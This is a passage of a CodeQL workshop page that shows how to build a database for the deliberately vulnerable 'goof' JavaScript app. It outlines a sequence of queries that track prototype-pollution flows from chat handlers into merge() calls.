docs/codeql/codeql-workshops/javascript/codeql-js-goof-workshop/workshop.html

<div id="outline-container-orga4429a0" class="outline-3">
<h3 id="orga4429a0"><span class="section-number-3">5.1</span> Import the CodeQL database</h3>
<div class="outline-text-3" id="text-5-1">
<p>
The codeql database for this project is part of the workshop zip file.  You
likely got it in the setup step, but here is the link:  <a href="https://drive.google.com/file/d/1eTHIFXO4AThVmI1eHdS2oi6caeDEkilD/view?usp=sharing">codeql-js-goof-workshop.zip</a>.
</p>

<p>
Next, import the database directory into your VS Code workspace; the name is
<code>js-goof-9300e9a</code>.
</p>

<p>
For completeness and reference, here are the steps used to build the codeql
database; this requires the codeql cli tools:
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">* build db</span>
<span style="color: #a0522d;">SRCDIR</span>=$<span style="color: #a0522d;">HOME</span>/local/goof
<span style="color: #a0522d;">DB</span>=$<span style="color: #a0522d;">HOME</span>/local/db/js-goof-$(<span style="color: #ff00ff;">cd</span> $<span style="color: #a0522d;">SRCDIR</span> &amp;&amp; git rev-parse --short HEAD)
<span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">DB</span>
<span style="color: #483d8b;">test</span> -d <span style="color: #8b2252;">"$DB"</span> &amp;&amp; rm -fR <span style="color: #8b2252;">"$DB"</span>
mkdir -p <span style="color: #8b2252;">"$DB"</span>

<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">PATH</span>=$<span style="color: #a0522d;">HOME</span>/local/vmsync/codeql224:<span style="color: #8b2252;">"$PATH"</span>
codeql database create --language=javascript -s $<span style="color: #a0522d;">SRCDIR</span>  -j 8 -v $<span style="color: #a0522d;">DB</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">Successfully created database at ~/local/db/js-goof-9300e9a</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org8824770" class="outline-3">
<h3 id="org8824770"><span class="section-number-3">5.2</span> Custom query for local flow</h3>
<div class="outline-text-3" id="text-5-2">
<p>
Based on what we found in <a href="#orgdc5bf28">Find problems in source code</a>, the sink should be
any argument to <code>merge()</code> past the first, so let's use that.
</p>

<p>
The files <a href="./flow-query-0.ql">./flow-query-0.ql</a> etc. build a local flow query from scratch for the
Javascript Prototype Pollution problem.  We cover these in detail in the
workshop, but here is the outline of what each introduces for later reference:
</p>

<ul class="org-ul">
<li><a href="./flow-query-0.ql">./flow-query-0.ql</a>  identify sink: from, where, select, MethodCallExpr</li>
<li><a href="./flow-query-1.ql">./flow-query-1.ql</a>  getAnArgument</li>
<li><a href="./flow-query-2.ql">./flow-query-2.ql</a>  Introduce <code>predicate</code> and convert to <code>predicate mergeCallArg</code></li>
<li><a href="./flow-query-3.ql">./flow-query-3.ql</a>  identify source: FunctionExpr, getName</li>
<li><a href="./flow-query-4.ql">./flow-query-4.ql</a>  parameter and body: getNumParameter, getBody</li>
<li><a href="./flow-query-5.ql">./flow-query-5.ql</a>  source argument: getParameter</li>
<li><a href="./flow-query-6.ql">./flow-query-6.ql</a>  convert to <code>predicate chatHandler</code></li>
<li><a href="./flow-query-7.ql">./flow-query-7.ql</a>  Local flow attempt: getASuccessor, <code>operator +</code>,
<code>DataFlowNode</code>, getAstNode</li>
<li><a href="./flow-query-8.ql">./flow-query-8.ql</a>  Flow debugging: flow from source to any</li>
<li><a href="./flow-query-9.ql">./flow-query-9.ql</a>  Flow debugging: sink only (sanity check)</li>
<li><a href="./flow-query-10.ql">./flow-query-10.ql</a>  Flow debugging: any to sink</li>
<li><a href="./flow-query-11.ql">./flow-query-11.ql</a>  Flow try: any to any child of sink: introduce <code>exists</code>,
getAChild, <code>operator *</code></li>
<li><a href="./flow-query-12.ql">./flow-query-12.ql</a>  Local flow: Re-introduce the source restriction,
simplify <code>exists</code>, get working flow query.</li>
<li><a href="./flow-query-13.ql">./flow-query-13.ql</a> Add <code>predicate mergeCallArg</code> and <code>predicate chatHandler</code>
taking <code>DataFlowNode</code> to clean up and for re-use in global flow query.</li>
</ul>
</div>
</div>

<div id="outline-container-org7c3269e" class="outline-3">
<h3 id="org7c3269e"><span class="section-number-3">5.3</span> Custom Global TaintTracking Query and Path Query</h3>
<div class="outline-text-3" id="text-5-3">
<p>
The <a href="#org8824770">Custom query for local flow</a> developed the predicates we need for a global
taint tracking query.  The files <a href="./GoofPrototypePollution-0.ql">./GoofPrototypePollution-0.ql</a> etc. develop
this query and list pairs of results (sources and sinks).  The sequence:
</p>
<ul class="org-ul">
<li><a href="./GoofPrototypePollution-0.ql">./GoofPrototypePollution-0.ql</a>  Raw global taint tracking configuration
template.  Introduces <code>class</code>, characteristic predicate,
<code>TaintTrackingConfiguration</code> and <code>hasFlow()</code>.</li>
<li><a href="./GoofPrototypePollution-1.ql">./GoofPrototypePollution-1.ql</a>  Plug in the previously developed predicates
<code>mergeCallArg</code> and <code>chatHandler</code>, see the flow pairs.</li>
<li><a href="./GoofPrototypePollution-2.ql">./GoofPrototypePollution-2.ql</a>  Changes to get a path query.  In addition to
the result pairs listed by <a href="./GoofPrototypePollution-1.ql">./GoofPrototypePollution-1.ql</a>, this <i>path query</i>
also shows some data flow paths between the sources and sinks.  For this
example, they are all local.</li>
</ul>
</div>
</div>
